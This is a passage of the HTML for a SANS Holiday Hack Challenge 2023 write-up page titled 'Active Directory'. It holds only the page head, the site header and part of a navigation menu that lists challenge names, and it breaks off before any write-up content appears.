
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Bonnie Martin (bonnie_0227@msn.com)">
      
      
      
        <link rel="prev" href="../o18/">
      
      
        <link rel="next" href="../o20/">
      
      
      <link rel="icon" href="../../img/misc/favicon.ico">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
    
    
      
        <title>Active Directory - SANS Holiday Hack Challenge 2023 Write-Up</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.50c56a3b.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../css/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="teal">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#active-directory" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="SANS Holiday Hack Challenge 2023 Write-Up" class="md-header__button md-logo" aria-label="SANS Holiday Hack Challenge 2023 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M224 0c13.3 0 24 10.7 24 24v46.1l23-23c9.4-9.4 24.6-9.4 33.9 0s9.4 24.6 0 33.9l-57 57v76.5l66.2-38.2L335 98.5c3.4-12.8 16.6-20.4 29.4-17s20.4 16.6 17 29.4l-8.4 31.3 37.1-21.4c11.5-6.6 26.2-2.7 32.8 8.8s2.7 26.2-8.8 32.8L397 183.8l31.5 8.4c12.8 3.4 20.4 16.6 17 29.4s-16.6 20.4-29.4 17l-77.8-20.9L272 256l66.2 38.2 77.8-20.9c12.8-3.4 26 4.2 29.4 17s-4.2 26-17 29.4l-31.4 8.5 37.1 21.4c11.5 6.6 15.4 21.3 8.8 32.8s-21.3 15.4-32.8 8.8L373 369.8l8.4 31.5c3.4 12.8-4.2 26-17 29.4s-26-4.2-29.4-17l-20.9-77.8-66.1-38.3v76.5l57 57c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0l-23-23v46c0 13.3-10.7 24-24 24s-24-10.7-24-24v-46.1l-23 23c-9.4 9.4-24.6 9.4-33.9 0s-9.4-24.6 0-33.9l57-57v-76.4L134 335.8l-20.9 77.8c-3.4 12.8-16.6 20.4-29.4 17s-20.4-16.6-17-29.4l8.3-31.4-37.1 21.4c-11.5 6.6-26.2 2.7-32.8-8.8s-2.7-26.2 8.8-32.8L51 328.2l-31.5-8.4c-12.8-3.4-20.4-16.6-17-29.4s16.6-20.4 29.4-17l77.8 20.9L176 256l-66.2-38.2-77.9 20.8c-12.8 3.4-26-4.2-29.4-17s4.2-26 17-29.4l31.5-8.4-37.1-21.4c-11.5-6.6-15.4-21.3-8.8-32.8s21.3-15.4 32.8-8.8L75 142.2l-8.4-31.5c-3.4-12.8 4.2-26 17-29.4s26 4.2 29.4 17l20.9 77.8 66.1 38.3v-76.5L143 81c-9.4-9.4-9.4-24.6 0-33.9s24.6-9.4 33.9 0l23 23V24c0-13.3 10.7-24 24-24z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS Holiday Hack Challenge 2023 Write-Up
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Active Directory
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="SANS Holiday Hack Challenge 2023 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holiday Hack Challenge 2023 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M224 0c13.3 0 24 10.7 24 24v46.1l23-23c9.4-9.4 24.6-9.4 33.9 0s9.4 24.6 0 33.9l-57 57v76.5l66.2-38.2L335 98.5c3.4-12.8 16.6-20.4 29.4-17s20.4 16.6 17 29.4l-8.4 31.3 37.1-21.4c11.5-6.6 26.2-2.7 32.8 8.8s2.7 26.2-8.8 32.8L397 183.8l31.5 8.4c12.8 3.4 20.4 16.6 17 29.4s-16.6 20.4-29.4 17l-77.8-20.9L272 256l66.2 38.2 77.8-20.9c12.8-3.4 26 4.2 29.4 17s-4.2 26-17 29.4l-31.4 8.5 37.1 21.4c11.5 6.6 15.4 21.3 8.8 32.8s-21.3 15.4-32.8 8.8L373 369.8l8.4 31.5c3.4 12.8-4.2 26-17 29.4s-26-4.2-29.4-17l-20.9-77.8-66.1-38.3v76.5l57 57c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0l-23-23v46c0 13.3-10.7 24-24 24s-24-10.7-24-24v-46.1l-23 23c-9.4 9.4-24.6 9.4-33.9 0s-9.4-24.6 0-33.9l57-57v-76.4L134 335.8l-20.9 77.8c-3.4 12.8-16.6 20.4-29.4 17s-20.4-16.6-17-29.4l8.3-31.4-37.1 21.4c-11.5 6.6-26.2 2.7-32.8-8.8s-2.7-26.2 8.8-32.8L51 328.2l-31.5-8.4c-12.8-3.4-20.4-16.6-17-29.4s16.6-20.4 29.4-17l77.8 20.9L176 256l-66.2-38.2-77.9 20.8c-12.8 3.4-26-4.2-29.4-17s4.2-26 17-29.4l31.5-8.4-37.1-21.4c-11.5-6.6-15.4-21.3-8.8-32.8s21.3-15.4 32.8-8.8L75 142.2l-8.4-31.5c-3.4-12.8 4.2-26 17-29.4s26 4.2 29.4 17l20.9 77.8 66.1 38.3v-76.5L143 81c-9.4-9.4-9.4-24.6 0-33.9s24.6-9.4 33.9 0l23 23V24c0-13.3 10.7-24 24-24z"/></svg>

    </a>
    SANS Holiday Hack Challenge 2023 Write-Up
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Objectives
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Objectives
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Christmas Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Christmas Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o1/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9c1.59 7.61-2 13-2 13h3c1.88-5.8 1-9.91.5-12m2.16-2.84c.17.21.34.43.47.66a7.1 7.1 0 0 1-.63 8.44 7.11 7.11 0 0 0-.55-6.49c-.08-.13-.17-.24-.25-.36a7.123 7.123 0 0 0-2.16-1.98 7.127 7.127 0 0 0-4.96 6.79c0 .74.11 1.45.31 2.11a7.073 7.073 0 0 1-1.33-4.14c0-2.35 1.14-4.43 2.89-5.73C8 6.35 6.46 6.67 5.12 7.5c-.62.41-1.16.88-1.62 1.41.55-1.33 1.5-2.52 2.8-3.34 1.5-.94 3.2-1.25 4.84-1.01C10.73 4 10.23 3.47 9.63 3c-.58-.42-1.21-.76-1.87-1 1.44.04 2.88.5 4.11 1.43.63.47 1.13 1.04 1.53 1.64.1 0 .19-.01.29-.01 3.2 0 5.91 2.11 6.81 5.02a7.073 7.073 0 0 0-4.84-2.92Z"/></svg>
  
  <span class="md-ellipsis">
    Holiday Hack Orientation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o2/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 17a5 5 0 0 1-5 5 5 5 0 0 1-5-5c0-1.5.65-2.83 1.69-3.75C8.26 12.61 8 11.83 8 11v-.41L5.04 8.87l-.21-.16-2.54.68-.26-.96 2.21-.59-1.98-1.15.5-.87 1.98 1.15-.59-2.22.96-.25.69 2.54.24.1 2.69 1.55a3.9 3.9 0 0 1 1.49-1.27C9.5 6.87 9 6 9 5a3 3 0 0 1 3-3 3 3 0 0 1 3 3c0 1-.5 1.87-1.22 2.42.6.29 1.11.73 1.49 1.27l2.69-1.55.24-.1.69-2.54.96.25-.59 2.22 1.98-1.15.5.87-1.98 1.15 2.21.59-.26.96-2.54-.68-.21.16L16 10.59V11c0 .83-.26 1.61-.69 2.25C16.35 14.17 17 15.5 17 17Z"/></svg>
  
  <span class="md-ellipsis">
    Snowball Fight
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o3/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 16c0 1.72-.63 3.3-1.66 4.5.41.39.66.91.66 1.5H6c0-.59.25-1.11.66-1.5A6.902 6.902 0 0 1 5 16H3c0-1.25.57-2.36 1.46-3.09l.01-.02A6.004 6.004 0 0 0 7 8V7a5 5 0 0 1 5-5 5 5 0 0 1 5 5v1c0 2 1 3.81 2.53 4.89l.01.02c.89.73 1.46 1.84 1.46 3.09h-2m-3 0a4 4 0 0 0-4-4 4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4m-6-7 2 1.5L14 9l-2-1.5L10 9m0-4a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m4 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg>
  
  <span class="md-ellipsis">
    Linux 101
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o4/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1a3 3 0 0 1 3 3v1a1 1 0 0 1 1 1v1.07c2.39 1.38 4 3.97 4 6.93a8 8 0 0 1-8 8 8 8 0 0 1-8-8c0-2.96 1.61-5.55 4-6.93V6a1 1 0 0 1 1-1V4a3 3 0 0 1 3-3m0 2a1 1 0 0 0-1 1v1h2V4a1 1 0 0 0-1-1m0 5c-1.78 0-3.37.77-4.47 2h8.94c-1.1-1.23-2.69-2-4.47-2m-5.66 8h1.25L6 14.43c.05.57.17 1.07.34 1.57m6.25 0-4-4H6.41l4 4h2.18m5.07-4h-1.25L18 13.57c-.05-.57-.17-1.07-.34-1.57m-6.25 0 4 4h2.18l-4-4h-2.18m.59 8c1.78 0 3.37-.77 4.47-2H7.53c1.1 1.23 2.69 2 4.47 2Z"/></svg>
  
  <span class="md-ellipsis">
    Reportinator
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o5/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6 14a1 1 0 0 1 1 1 1 1 0 0 1-1 1 5 5 0 0 1-5-5 5 5 0 0 1 5-5c1-2.35 3.3-4 6-4 3.43 0 6.24 2.66 6.5 6.03L19 8a4 4 0 0 1 4 4 4 4 0 0 1-4 4h-1a1 1 0 0 1-1-1 1 1 0 0 1 1-1h1a2 2 0 0 0 2-2 2 2 0 0 0-2-2h-2V9a5 5 0 0 0-5-5C9.5 4 7.45 5.82 7.06 8.19 6.73 8.07 6.37 8 6 8a3 3 0 0 0-3 3 3 3 0 0 0 3 3m1.88 4.07 2.19-.57-1.61-1.62c-.39-.38-.39-1.02 0-1.42.39-.39 1.04-.39 1.42 0l1.62 1.61.57-2.19a1 1 0 1 1 1.93.52l-.59 2.19L15.6 16a1 1 0 1 1 .52 1.93l-2.19.57 1.61 1.62c.39.38.39 1.03 0 1.42-.39.39-1.04.39-1.42 0l-1.62-1.61-.57 2.19A1 1 0 1 1 10 21.6l.59-2.19L8.4 20a1 1 0 1 1-.52-1.93Z"/></svg>
  
  <span class="md-ellipsis">
    Azure 101
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Island of Misfit Toys
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Island of Misfit Toys
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o7/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12 8-1.33.09C9.81 7.07 7.4 4.5 5 4.5c0 0-1.97 2.96-.04 6.91-.55.83-.89 1.26-.96 2.25l-1.93.29.21.98 1.76-.26.14.71-1.57.94.47.89 1.45-.89C5.68 18.76 8.59 20 12 20s6.32-1.24 7.47-3.68l1.45.89.47-.89-1.57-.94.14-.71 1.76.26.21-.98-1.93-.29c-.07-.99-.41-1.42-.96-2.25C20.97 7.46 19 4.5 19 4.5c-2.4 0-4.81 2.57-5.67 3.59L12 8m-3 3a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1m6 0a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1m-4 3h2l-.7 1.39c.2.64.76 1.11 1.45 1.11a1.5 1.5 0 0 0 1.5-1.5h.5a2 2 0 0 1-2 2c-.75 0-1.4-.41-1.75-1-.35.59-1 1-1.75 1a2 2 0 0 1-2-2h.5a1.5 1.5 0 0 0 1.5 1.5c.69 0 1.25-.47 1.45-1.11L11 14Z"/></svg>
  
  <span class="md-ellipsis">
    Hashcat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o8/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 16c0 1.72-.63 3.3-1.66 4.5.41.39.66.91.66 1.5H6c0-.59.25-1.11.66-1.5A6.902 6.902 0 0 1 5 16H3c0-1.25.57-2.36 1.46-3.09l.01-.02A6.004 6.004 0 0 0 7 8V7a5 5 0 0 1 5-5 5 5 0 0 1 5 5v1c0 2 1 3.81 2.53 4.89l.01.02c.89.73 1.46 1.84 1.46 3.09h-2m-3 0a4 4 0 0 0-4-4 4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4m-6-7 2 1.5L14 9l-2-1.5L10 9m0-4a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m4 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg>
  
  <span class="md-ellipsis">
    Linux PrivESC
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o9/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 1c-2.76 0-5 2.24-5 5v2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12c1.11 0 2-.89 2-2V10a2 2 0 0 0-2-2h-1V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2h2V6c0-2.76-2.24-5-5-5m-8 12a2 2 0 0 1 2 2c0 1.11-.89 2-2 2a2 2 0 1 1 0-4Z"/></svg>
  
  <span class="md-ellipsis">
    Luggage Lock
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o10/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M7 1c-1.1 0-2 .9-2 2v18a2 2 0 0 0 2 2h7c2.76 0 5-2.24 5-5V3a2 2 0 0 0-2-2H7m1 3h8v7H8V4m1 10h1v2h2v1h-2v2H9v-2H7v-1h2v-2m7 1c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1m-2 2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1Z"/></svg>
  
  <span class="md-ellipsis">
    Game Cartridges - Vol 1
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Film Noir Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Film Noir Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o11/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 22c-1.32 0-1.85-2.36-1.96-3.3a5.56 5.56 0 0 1 .32-2.7 2.5 2.5 0 0 1 1.87-1.62c1.17-.2 2 .5 3.06.74a1.21 1.21 0 0 0 1.56-1.37C9.41 12.03 6.28 12 5 12c0-1.86 2.04-2.1 3.5-1.96a10.8 10.8 0 0 1 2.54.56c.5.17 1.08.6 1.63.56.83-.07 1-.93.64-1.56C12.44 8.12 9.97 8 8.5 8c0-2 1.73-2.38 3.39-2.08a11.58 11.58 0 0 1 2.49.79c.51.22 1.12.64 1.68.45 1.44-.44-.06-1.98-.7-2.35a6.6 6.6 0 0 0-1.42-.58c-.54-.16-1.2-.1-.71-.73a5.13 5.13 0 0 1 2.73-1.24c1.89-.44 4.5-.52 4.96 1.86a5.3 5.3 0 0 1-.85 3.58 38.96 38.96 0 0 1-6.85 8.63 36.6 36.6 0 0 1-4.6 3.99C7.62 21.04 6.3 22 5 22Z"/></svg>
  
  <span class="md-ellipsis">
    Na'an
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o12/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
  
  <span class="md-ellipsis">
    KQL Kraken Hunt
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o13/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12 20 .76-3c-3.26-.21-6.17-1.6-7.01-3.42-.09.48-.22.92-.42 1.25C4.67 16 3.33 16 2 16c1.1 0 1.5-1.57 1.5-3.5S3.1 9 2 9c1.33 0 2.67 0 3.33 1.17.2.33.33.77.42 1.25.65-1.42 2.57-2.57 4.91-3.1L9 5c2 0 4 0 5.33.67 1.13.56 1.78 1.6 2.36 2.71 2.92.7 5.31 2.28 5.31 4.12 0 1.88-2.5 3.5-5.5 4.16-.83 1.1-1.64 2.12-2.33 2.67-.84.67-1.5.67-2.17.67m5-9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg>
  
  <span class="md-ellipsis">
    Phish Detection Agency
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pixel Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            Pixel Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o14/" class="md-nav__link">
        
  
